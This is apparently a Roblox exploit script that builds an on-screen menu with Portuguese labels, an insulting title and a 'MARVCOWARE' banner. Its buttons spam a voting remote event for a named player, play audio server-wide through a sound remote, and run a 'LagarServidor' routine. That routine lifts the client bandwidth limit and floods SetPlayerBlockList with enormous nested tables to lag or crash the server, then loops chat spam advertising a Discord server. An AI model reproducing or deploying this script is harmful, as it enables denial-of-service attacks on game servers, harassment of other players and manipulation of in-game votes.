-- Gui to Lua
-- Version: 3.2

-- Instances:

local Screen = Instance.new("ScreenGui")
local reddyneocaralho = Instance.new("Frame")
local Acao2 = Instance.new("TextButton")
local UICorner = Instance.new("UICorner")
local TextBox = Instance.new("TextBox")
local UICorner_2 = Instance.new("UICorner")
local Musica = Instance.new("TextButton")
local UICorner_3 = Instance.new("UICorner")
local Lag = Instance.new("TextButton")
local UICorner_4 = Instance.new("UICorner")
local UICorner_5 = Instance.new("UICorner")
local TextLabel = Instance.new("TextLabel")
local UIGradient = Instance.new("UIGradient")
local TextLabel_2 = Instance.new("TextLabel")
local UIGradient_2 = Instance.new("UIGradient")

--Properties:

Screen.Name = "Screen"
Screen.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
Screen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

reddyneocaralho.Name = "reddyneocaralho"
reddyneocaralho.Parent = Screen
reddyneocaralho.BackgroundColor3 = Color3.fromRGB(21, 21, 21)
reddyneocaralho.BackgroundTransparency = 0.300
reddyneocaralho.BorderColor3 = Color3.fromRGB(0, 0, 0)
reddyneocaralho.BorderSizePixel = 2
reddyneocaralho.Position = UDim2.new(0.721093655, 0, 0.612244904, 0)
reddyneocaralho.Size = UDim2.new(0.188215792, 0, 0.318367332, 0)

Acao2.Name = "Acao2"
Acao2.Parent = reddyneocaralho
Acao2.BackgroundColor3 = Color3.fromRGB(255, 255, 127)
Acao2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Acao2.BorderSizePixel = 0
Acao2.Position = UDim2.new(0.0854295567, 0, 0.0448717959, 0)
Acao2.Size = UDim2.new(0.342746347, 0, 0.134615391, 0)
Acao2.Font = Enum.Font.SourceSans
Acao2.Text = "votar pra ficar"
Acao2.TextColor3 = Color3.fromRGB(0, 0, 0)
Acao2.TextScaled = true
Acao2.TextSize = 14.000
Acao2.TextWrapped = true

UICorner.Parent = Acao2

TextBox.Parent = reddyneocaralho
TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 127)
TextBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextBox.BorderSizePixel = 0
TextBox.Position = UDim2.new(0.484832883, 0, 0.0448717959, 0)
TextBox.Size = UDim2.new(0.463503659, 0, 0.198717952, 0)
TextBox.Font = Enum.Font.SourceSans
TextBox.PlaceholderText = "Pessoa"
TextBox.Text = ""
TextBox.TextColor3 = Color3.fromRGB(0, 0, 0)
TextBox.TextSize = 14.000

UICorner_2.Parent = TextBox

Musica.Name = "Musica"
Musica.Parent = reddyneocaralho
Musica.BackgroundColor3 = Color3.fromRGB(255, 255, 127)
Musica.BorderColor3 = Color3.fromRGB(0, 0, 0)
Musica.BorderSizePixel = 0
Musica.Position = UDim2.new(0.0809692889, 0, 0.423076928, 0)
Musica.Size = UDim2.new(0.346606374, 0, 0.134615391, 0)
Musica.Font = Enum.Font.SourceSans
Musica.Text = "Musica midia"
Musica.TextColor3 = Color3.fromRGB(0, 0, 0)
Musica.TextScaled = true
Musica.TextSize = 14.000
Musica.TextWrapped = true

UICorner_3.Parent = Musica

Lag.Name = "Lag"
Lag.Parent = reddyneocaralho
Lag.BackgroundColor3 = Color3.fromRGB(255, 255, 127)
Lag.BorderColor3 = Color3.fromRGB(0, 0, 0)
Lag.BorderSizePixel = 0
Lag.Position = UDim2.new(0.0809692889, 0, 0.240330279, 0)
Lag.Size = UDim2.new(0.346606523, 0, 0.111799218, 0)
Lag.Font = Enum.Font.SourceSans
Lag.Text = "LagarServidor"
Lag.TextColor3 = Color3.fromRGB(0, 0, 0)
Lag.TextScaled = true
Lag.TextSize = 14.000
Lag.TextWrapped = true

UICorner_4.Parent = Lag

UICorner_5.Parent = reddyneocaralho

TextLabel.Parent = Screen
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0.689422011, 0, 0.517053008, 0)
TextLabel.Rotation = 7.000
TextLabel.Size = UDim2.new(0.251309127, 0, 0.0940159038, 0)
TextLabel.Font = Enum.Font.Gotham
TextLabel.Text = "Reddyn fucker xD"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true

UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(48, 12, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
UIGradient.Parent = TextLabel

TextLabel_2.Parent = Screen
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_2.BorderSizePixel = 0
TextLabel_2.Position = UDim2.new(0.754327774, 0, 0.482993782, 0)
TextLabel_2.Rotation = 7.000
TextLabel_2.Size = UDim2.new(0.121497661, 0, 0.0621343777, 0)
TextLabel_2.Font = Enum.Font.Gotham
TextLabel_2.Text = "v1.2"
TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.TextScaled = true
TextLabel_2.TextSize = 14.000
TextLabel_2.TextWrapped = true

UIGradient_2.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(48, 12, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
UIGradient_2.Parent = TextLabel_2

-- Scripts:

local function PFKLN_fake_script() -- Screen.LocalScript 
	local script = Instance.new('LocalScript', Screen)

	--
	script.Parent.reddyneocaralho.Musica.MouseButton1Down:Connect(function()
	    local sound = true 
		local ID = "rbxassetid://5647277440" 
		local Name = "ambiente" 
		local Volume = 100 
		local Pitch = 1 
	
		for i,v in pairs(game:GetService("Workspace"):GetDescendants()) do
			if v:IsA("RemoteEvent") and v.Name == "AC6_FE_Sounds" then
				if sound == true then
					v:FireServer("newSound", Name, workspace, ID, Pitch, Volume, true)
					v:FireServer("playSound", Name)
				end 
	
				if sound == false then
					v:FireServer("stopSound", Name)
				end
			end
		end
	
	end)
	script.Parent.reddyneocaralho.Acao2.MouseButton1Click:Connect(function()
			local evento = game.ReplicatedStorage:WaitForChild("votacao_para_ficar")
			local pessoa = script.Parent.reddyneocaralho.TextBox.Text
		while wait(0.3) do
			evento:FireServer(pessoa)
		end
	end)
	--
	script.Parent.reddyneocaralho.Lag.MouseButton1Click:Connect(function()
		local char = game:GetService('Players').LocalPlayer.Character or nil
		if char then
			char.HumanoidRootPart.CFrame = CFrame.new(0,9e9,0)
			task.wait(0.5)
			char.HumanoidRootPart.Anchored = true
		end
		while wait(1.5) do --// don't change it's the best
			game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
			local function getmaxvalue(val)
				local mainvalueifonetable = 499999
				if type(val) ~= "number" then
					return nil
				end
				local calculateperfectval = (mainvalueifonetable/(val+2))
				return calculateperfectval
			end
	
			local function bomb(tableincrease, tries)
				local maintable = {}
				local spammedtable = {}
	
				table.insert(spammedtable, {})
				z = spammedtable[1]
	
				for i = 1, tableincrease do
					local tableins = {}
					table.insert(z, tableins)
					z = tableins
				end
	
				local calculatemax = getmaxvalue(tableincrease)
				local maximum
	
				if calculatemax then
					maximum = calculatemax
				else
					maximum = 999999
				end
	
				for i = 1, maximum do
					table.insert(maintable, spammedtable)
				end
	
				for i = 1, tries do
					game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
				end
			end
	
			bomb(289, 5) --// change values if client crashes
		end
		
		for _,s in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
			if s:IsA("Motor6D") and s.Name ~= "Neck" then
				local fard = s.Parent
				s:Destroy()
				fard.CFrame = CFrame.new(9e9 * _,9e9* _,9e9*_)
				wait()
			end
		end
		
		--[[
	
	███╗   ███╗ █████╗ ██████╗ ██╗   ██╗ ██████╗ ██████╗ ██╗    ██╗ █████╗ ██████╗ ███████╗
	████╗ ████║██╔══██╗██╔══██╗██║   ██║██╔════╝██╔═══██╗██║    ██║██╔══██╗██╔══██╗██╔════╝
	██╔████╔██║███████║██████╔╝██║   ██║██║     ██║   ██║██║ █╗ ██║███████║██████╔╝█████╗
	██║╚██╔╝██║██╔══██║██╔══██╗╚██╗ ██╔╝██║     ██║   ██║██║███╗██║██╔══██║██╔══██╗██╔══╝
	██║ ╚═╝ ██║██║  ██║██║  ██║ ╚████╔╝ ╚██████╗╚██████╔╝╚███╔███╔╝██║  ██║██║  ██║███████╗
	╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝   ╚═════╝ ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
	
	]]--
		local char = game:GetService('Players').LocalPlayer.Character or nil
		if char then
			char.HumanoidRootPart.CFrame = CFrame.new(0,9e9,0)
			task.wait(0.5)
			char.HumanoidRootPart.Anchored = true
		end
		while wait(1.5) do --// don't change it's the best
			game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
			local function getmaxvalue(val)
				local mainvalueifonetable = 499999
				if type(val) ~= "number" then
					return nil
				end
				local calculateperfectval = (mainvalueifonetable/(val+2))
				return calculateperfectval
			end
	
			local function bomb(tableincrease, tries)
				local maintable = {}
				local spammedtable = {}
	
				table.insert(spammedtable, {})
				z = spammedtable[1]
	
				for i = 1, tableincrease do
					local tableins = {}
					table.insert(z, tableins)
					z = tableins
				end
	
				local calculatemax = getmaxvalue(tableincrease)
				local maximum
	
				if calculatemax then
					maximum = calculatemax
				else
					maximum = 999999
				end
	
				for i = 1, maximum do
					table.insert(maintable, spammedtable)
				end
	
				for i = 1, tries do
					game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
				end
			end
	
			bomb(289, 5) --// change values if client crashes
		end
		local phrases = {"marvco4362 | my server is .gg/soggy join it for the script", "marvco4362 | im lagging this server i hate all of you", "marvco4362 | together we can get rid of all the script kiddies"}
	
		while true do
			for i = 1, 5 do
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(phrases[i], "All")
				wait(2.25)
			end
		end
	end)
end
coroutine.wrap(PFKLN_fake_script)()
